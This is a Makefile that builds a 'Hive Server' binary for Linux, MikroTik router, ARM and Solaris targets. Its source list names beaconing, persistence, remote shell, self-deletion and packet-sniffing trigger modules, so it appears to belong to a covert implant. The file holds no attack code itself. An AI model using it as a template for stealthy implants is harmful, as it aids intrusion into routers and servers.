####################################################
# Architecture-agnostic Makefile for Hive Server
####################################################

SERVER_BASENAME = hived

#Default FLAGS

CFLAGS := -Wall -Wextra -ansi -std=gnu99
CFLAGS += -D_X86 -lpthread -lutil
CFLAGS += -I. -I../common -I../common/crypto -I../common/ssl/include
CFLAGS += -D_USE_BASH
CFLAGS += -DLINUX
LDFLAGS = -lpthread -lutil #-llibpolarssl -llibbz2

# TARGET Configuration
ifeq ("$(TARGET)", "linux-x86")
include ../common/Makefile-include.linux-x86
else ifeq ("$(TARGET)", "linux-x86_64")
include ../common/Makefile-include.linux-x86_64
else ifeq ("$(TARGET)", "mikrotik-mips")
include ../common/Makefile-include.mikrotik-mips
else ifeq ("$(TARGET)", "mikrotik-mipsel")
include ../common/Makefile-include.mikrotik-mipsel
else ifeq ("$(TARGET)", "mikrotik-x86")
include ../common/Makefile-include.mikrotik-x86
else ifeq ("$(TARGET)", "mikrotik-ppc")
include ../common/Makefile-include.mikrotik-ppc
else ifeq ("$(TARGET)", "arm")
include ../common/Makefile-include.arm
else ifeq ("$(TARGET)", "solaris-sparc")
include ../common/Makefile-include.solaris-sparc
else ifeq ("$(TARGET)", "solaris-x86")
include ../common/Makefile-include.solaris-x86
else
$(error Invalid target "$(TARGET)")
endif

BIN = .
LIB = .

COMMON = ../common
CRYPTO = $(COMMON)/crypto
SSL = $(COMMON)/ssl/library
BZIP2 = $(COMMON)/bzip2
INCLUDES = -I$(SSL)/include -I$(BZIP2) -I../common -I.
LIBSSL = $(SSL)/libpolarssl.a
LIBBZIP2 = $(BZIP2)/libbz2.a
LIBCRYPTO = $(CRYPTO)/libcrypto.a

.PHONY: $(BZIP2)/ARCH_BUILD $(CRYPTO)/ARCH_BUILD $(SSL)/ARCH_BUILD
include $(BZIP2)/ARCH_BUILD
include $(CRYPTO)/ARCH_BUILD
include $(SSL)/ARCH_BUILD
SERVER_SRCS =	beacon.c persistence.c launchshell.c \
		shuffle.c twofish.c farm9crypt.c jshell.c \
		survey_mac.c survey_uptime.c trigger_listen.c daemonize.c \
		main.c tiny_crc16.c \
		self_delete.c trigger_b64.c trigger_payload.c trigger_sniff.c \
		threads.c trigger_callback_session.c client_session.c run_command.c \
		get_data.c process_list.c netstat_an.c netstat_rn.c ifconfig.c compression.c

#COMMON_OBJS =	$(COMMON)/crypto.o $(COMMON)/init_crypto_strings.o $(COMMON)/string_utils.o

LIBS = $(LIBBZIP2) $(LIBCRYPTO) $(LIBSSL) $(LIBCRYPTO)

# Debug Configuration
PS = process_list.c
NETSTAT = netstat_an.c netstat_rn.c
IFC = ifconfig.c
DBGFLAGS += -DDEBUG -D_DEBUG -g

#STRIPFLAGS += --strip-all --remove-section=.comment --remove-section=.note

OS = $(shell uname)

#ifeq ($(OS),Linux)
#ARCH = $(shell uname -m)
#ARCH=x86
#endif
.PHONY: force-rebuild
ifdef ARCH_BUILD_BZIP2
  ifneq ("$(ARCH_BUILD_BZIP2)", "$(TARGET)")
    BZIP2_REBUILD:=force-rebuild
  else
    BZIP2_REBUILD:=
  endif
else
  BZIP2_REBUILD:=force-rebuild
endif

ifdef ARCH_BUILD_CRYPTO
  ifneq ("$(ARCH_BUILD_CRYPTO)", "$(TARGET)")
    CRYPTO_REBUILD:=force-rebuild
  else
    CRYPTO_REBUILD:=
  endif
else
  CRYPTO_REBUILD:=force-rebuild
endif

ifdef ARCH_BUILD_SSL
  ifneq ("$(ARCH_BUILD_SSL)", "$(TARGET)")
    SSL_REBUILD:=force-rebuild
  else
    SSL_REBUILD:=
  endif
else
  SSL_REBUILD:=force-rebuild
endif

SERVER = $(SERVER_BASENAME)-$(TARGET)

$(info )
$(info )
$(info =========================================================================)
$(info .       BUILDING $(SERVER))
$(info =========================================================================)
$(info TARGET: $(TARGET))
$(info SRCDIR: $(PWD))
$(info CFLAGS: $(CFLAGS))
$(info =========================================================================)
$(info )

#.SILENT:

.PHONY: all
all: $(SERVER) $(SERVER)-dbg

$(LIBSSL): $(SSL_REBUILD)
	cd $(SSL) && $(MAKE) TARGET=$(TARGET)

$(LIBBZIP2): $(BZIP2_REBUILD)
	cd $(BZIP2) && $(MAKE) TARGET=$(TARGET)

$(LIBCRYPTO): $(CRYPTO_REBUILD)
	cd $(CRYPTO) && $(MAKE) TARGET=$(TARGET)

.PHONY: debug
debug: $(SERVER)-dbg

.PHONY: release
release: $(SERVER)

$(SERVER): $(LIBSSL) $(LIBBZIP2) init_strings.o $(LIBCRYPTO)
ifeq ($(OS),Linux)
	echo -e "\tLD\t\t$@"
	$(CC) $(CFLAGS) $(SERVER_SRCS) $(LDFLAGS) init_strings.o string_utils.o $(LIBS) -o $(BIN)/$(SERVER)
	echo -e "\tStripping\t$@"
	echo "$(STRIP) $(BIN)/$(SERVER)"
	md5sum $(BIN)/$(SERVER) > $(BIN)/$(SERVER).md5
endif

$(SERVER)-dbg: $(LIBSSL) $(LIBBZIP2) $(LIBCRYPTO) init_strings.o
ifeq ($(OS),Linux)
	echo -e "\tLD\t\t$@"
	$(CC) $(CFLAGS) $(DBGFLAGS) $(SERVER_SRCS) $(LDFLAGS) init_strings.o string_utils.o $(LIBS) -o $(BIN)/$(SERVER)-dbg
	md5sum $(BIN)/$(SERVER)-dbg > $(BIN)/$(SERVER)-dbg.md5
endif

valgrind: $(LIBSSL) $(LIBBZIP2) $(LIBCRYPTO)
ifeq ($(OS),Linux)
	$(CC) -D__VALGRIND__ -D_IFCONFIG -D_NETSTAT_AN -D_NETSTAT_RN -D_PS_EF $(CFLAGS) $(DBGFLAGS) $(SERVER_SRCS) $(PS) $(IFC) $(NETSTAT) -L$(LIB) -o $(BIN)/$(SERVER)-$@
endif

.PHONY: efence
efence: $(LIBSSL) $(LIBBZIP2) $(LIBCRYPTO)
ifeq ($(OS),Linux)
	$(CC) -lefence -D__EFENCE__ -D_IFCONFIG -D_NETSTAT_AN -D_NETSTAT_RN -D_PS_EF $(CFLAGS) $(DBGFLAGS) $(SERVER_SRCS) $(PS) $(IFC) $(NETSTAT) -L$(LIB) -o $(BIN)/$(SERVER)-$@
endif

.PHONY: strings
strings: init_strings.o

init_strings.o: init_strings.c string_utils.o
	echo -e "\tCC\t\t$<"
	$(CC) -c $(CFLAGS) init_strings.c

init_strings.c: server_strings.txt string_utils.h
	echo -e "\tGenerating\t$@"
	python mod_gen_string_header.py server_strings.txt SERVER_STRINGS

string_utils.o: string_utils.h string_utils.c
	echo -e "\tCC\t\t$<"
	$(CC) -c $(CFLAGS) string_utils.c 

.PHONY: clean
clean:	$(SERVER)
	make -f ./Makefile clean

.PHONY: svnclean
svnclean: clean

.PHONY: md5
md5: all
	md5sum $(BIN)/$(SERVER)-dbg > $(BIN)/$(SERVER)-dbg.md5
	md5sum $(BIN)/$(SERVER) > $(BIN)/$(SERVER).md5

.PHONY: tarball	
tarball:
	make -f ./Makefile tarball

.c.o:
	echo -e "   CC        $<"
	$(CC) $(CFLAGS) -c $<
